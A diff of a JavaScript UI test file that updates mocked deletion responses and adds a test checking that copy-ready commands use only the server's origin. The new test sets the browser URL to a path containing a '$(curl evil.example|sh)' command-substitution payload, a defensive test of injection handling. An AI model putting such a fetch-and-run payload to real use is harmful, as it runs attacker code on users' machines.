@@ -161,7 +161,7 @@ describe("FailureGroupPage", () => {
       ...base,
       trashFailures: (group, selection) => {
         trashed.push([group, selection]);
-        return Promise.resolve({ trashed: 46 });
+        return Promise.resolve({ trashed: 46, ids: [] });
       },
     });
     fireEvent.click(await screen.findByLabelText("Select mirrorsite4.com"));
@@ -285,7 +285,7 @@ describe("select all matching", () => {
       ...paged,
       trashFailures: (_g, selection) => {
         trashed.push(selection);
-        return Promise.resolve({ trashed: 1 });
+        return Promise.resolve({ trashed: 1, ids: [11] });
       },
     });
     fireEvent.click(await screen.findByLabelText("Select all loaded"));
@@ -385,7 +385,7 @@ describe("FailureDomainPage", () => {
       ...client,
       trashFailures: (_g, selection) => {
         trashed.push(selection);
-        return Promise.resolve({ trashed: 1 });
+        return Promise.resolve({ trashed: 1, ids: [11] });
       },
     });
     fireEvent.click(await screen.findByLabelText("Select snapshot 11"));
@@ -498,5 +498,15 @@ describe("selection never crosses groups", () => {
     await screen.findByText("site10.com");
     expect(screen.queryByText(/selected/)).toBeNull();
     expect(screen.queryByRole("button", { name: "Delete permanently" })).toBeNull();
+  });
+});
+
+describe("commands offered for copying", () => {
+  test("carry the server's origin only, never the path a link put in the address bar", async () => {
+    const { serverUrl } = await import("../features/failures/shared");
+    (window as unknown as { happyDOM: { setURL(url: string): void } }).happyDOM.setURL(
+      "https://archive.example.com/$(curl%20evil.example|sh);x/#/connect",
+    );
+    expect(serverUrl()).toBe("https://archive.example.com");
   });
 });
